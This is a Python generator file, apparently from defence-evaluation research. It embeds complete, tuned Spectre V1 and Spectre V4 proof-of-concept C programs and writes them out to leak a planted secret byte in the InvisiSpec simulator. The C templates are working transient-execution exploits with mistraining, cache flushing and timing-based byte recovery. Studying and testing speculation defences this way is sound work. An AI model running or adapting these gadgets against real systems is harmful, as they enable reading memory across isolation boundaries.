"""Tuned, EXECUTION-LEAKING runnable gadgets.

Unlike the structural gadgets (gen/synth/spec_out, for Spectector) and the
original runnable PoCs (gen/synth/out, which are under-tuned and don't leak on a
real leaky microarch), these follow the spectre_full-proven recipe and actually
recover the planted secret in InvisiSpec (UnsafeBaseline O3 + classic cache):

  - probe stride 512 (avoids spatial prefetch / aliasing)
  - flush the bounds variable each round -> wide speculation window
  - 5:1 branchless mistrain (bit-twiddling, no jumps to tip the predictor)
  - CACHE_HIT_THRESHOLD 80, score-based recovery over many tries, mixed order

The `{secret}` knob plants a specific byte; recovering the *actual* planted
value (not a constant) is the built-in jitter control.
"""
from __future__ import annotations
import os
import json

# SPECTRE_V1: bounds-check bypass. Proven to leak (recovered==secret) in InvisiSpec.
_TUNED_V1 = r'''
#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>
#define STRIDE 512
#define HIT 80
unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = {{1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16}};
uint8_t unused2[64];
uint8_t array2[256*STRIDE];
uint8_t SECRET = 0;
uint8_t temp = 0;
void victim(size_t x){{ if(x<array1_size){{ temp &= array2[array1[x]*STRIDE]; }} }}
int recover_byte(size_t mx){{
  static int results[256]; int tries,i,j,k,mix,junk=0; size_t tx,x; register uint64_t t1,t2; volatile uint8_t*a;
  for(i=0;i<256;i++)results[i]=0;
  for(tries=999;tries>0;tries--){{
    for(i=0;i<256;i++)_mm_clflush(&array2[i*STRIDE]);
    tx=tries%array1_size;
    for(j=29;j>=0;j--){{
      _mm_clflush(&array1_size);
      for(volatile int z=0;z<100;z++){{}}
      x=((j%6)-1)&~0xFFFF; x=(x|(x>>16)); x=tx^(x&(mx^tx));
      victim(x);
    }}
    for(i=0;i<256;i++){{
      mix=((i*167)+13)&255; a=&array2[mix*STRIDE];
      t1=__rdtscp(&junk); t1=__rdtscp(&junk); junk=*a;
      t2=__rdtscp(&junk)-t1; t2=__rdtscp(&junk)-t1;
      if(t2<=HIT && mix!=array1[tries%array1_size]) results[mix]++;
    }}
    j=k=-1;
    for(i=0;i<256;i++){{ if(j<0||results[i]>=results[j]){{k=j;j=i;}} else if(k<0||results[i]>=results[k]){{k=i;}} }}
    if(results[j]>=(2*results[k]+5)||(results[j]==2&&results[k]==0)) break;
  }}
  results[0]^=junk; return j;
}}
int main(){{
  for(int i=0;i<sizeof(array2);i++)array2[i]=1;
  SECRET={secret};
  size_t mx=(size_t)((char*)&SECRET-(char*)array1);
  int got=recover_byte(mx);
  printf("recovered=0x%02X actual=0x%02X\n",got,SECRET);
  if(got==SECRET) printf("SUCCESS! Leaked the actual SPECTRE_V1 secret.\n");
  else printf("No SPECTRE_V1 secret leaked or could not detect leakage.\n");
  return 0;
}}
'''

# SPECTRE_V4: speculative store bypass. A slow store (address flushed) is
# bypassed by a fast dependent load that reads the STALE secret and transmits
# it. Confirmed to leak in InvisiSpec (O3 memory-dependence predictor speculates
# the load past the store).
_TUNED_V4 = r'''
#include <stdint.h>
#include <stdio.h>
#include <x86intrin.h>
#define STRIDE 512
#define HIT 80
uint8_t array2[256*STRIDE];
uint8_t buf[256];
volatile size_t sidx = 0;
uint8_t SECRET = 0;
uint8_t temp = 0;
void ssb_victim(){{
  _mm_clflush((void*)&sidx);
  for(volatile int z=0;z<50;z++){{}}
  buf[sidx] = 0;                       /* slow store buf[0]=0 */
  temp &= array2[buf[0] * STRIDE];     /* fast load may bypass store -> stale SECRET */
}}
int recover(){{
  static int results[256]; int tries,i,j,k,mix,junk=0; register uint64_t t1,t2; volatile uint8_t*a;
  for(i=0;i<256;i++)results[i]=0;
  for(tries=999;tries>0;tries--){{
    buf[0]=SECRET; _mm_mfence();
    for(i=0;i<256;i++)_mm_clflush(&array2[i*STRIDE]);
    _mm_mfence(); ssb_victim();
    for(i=0;i<256;i++){{
      mix=((i*167)+13)&255; a=&array2[mix*STRIDE];
      t1=__rdtscp(&junk); t1=__rdtscp(&junk); junk=*a;
      t2=__rdtscp(&junk)-t1; t2=__rdtscp(&junk)-t1;
      if(t2<=HIT && mix!=0) results[mix]++;
    }}
    j=k=-1;
    for(i=0;i<256;i++){{ if(j<0||results[i]>=results[j]){{k=j;j=i;}} else if(k<0||results[i]>=results[k]){{k=i;}} }}
    if(results[j]>=(2*results[k]+5)||(results[j]==2&&results[k]==0)) break;
  }}
  results[0]^=junk; return j;
}}
int main(){{
  for(int i=0;i<sizeof(array2);i++)array2[i]=1;
  SECRET={secret};
  int got=recover();
  printf("recovered=0x%02X actual=0x%02X\n",got,SECRET);
  if(got==SECRET) printf("SUCCESS! Leaked the actual SPECTRE_V4 secret.\n");
  else printf("No SPECTRE_V4 secret leaked or could not detect leakage.\n");
  return 0;
}}
'''

# Classes a generic OoO baseline (InvisiSpec) can execute-leak: conditional-branch
# (V1) and store-bypass (V4). Vendor-specific classes (BTB/RSB/fault) are not
# modeled by the baseline O3, so tuning cannot make them leak here.
TUNED = {"SPECTRE_V1": _TUNED_V1, "SPECTRE_V4": _TUNED_V4}


def render_tuned(vuln_class, secret):
    if vuln_class not in TUNED:
        raise KeyError(f"no tuned execution-leaking gadget for {vuln_class} "
                       f"(baseline O3 does not model its speculation source)")
    if not (0 <= secret <= 255):
        raise ValueError("secret must be a byte 0..255")
    return TUNED[vuln_class].format(secret=secret)


def generate_tuned(out_dir, secrets=None):
    """Emit tuned runnable gadgets. `secrets` maps vuln_class->byte (default
    distinct per class for the jitter control). Returns index rows."""
    os.makedirs(out_dir, exist_ok=True)
    if secrets is None:
        secrets = {"SPECTRE_V1": ord("S"), "SPECTRE_V4": ord("V")}
    rows = []
    for cls in TUNED:
        secret = secrets.get(cls, ord("S"))
        gid = f"tuned_{cls}"
        path = os.path.join(out_dir, gid + ".c")
        with open(path, "w") as f:
            f.write(render_tuned(cls, secret))
        rows.append({"gadget_id": gid, "path": path, "vuln_class": cls,
                     "secret": secret})
    with open(os.path.join(out_dir, "tuned_gadgets.jsonl"), "w") as f:
        for r in rows:
            f.write(json.dumps(r, sort_keys=True) + "\n")
    return rows
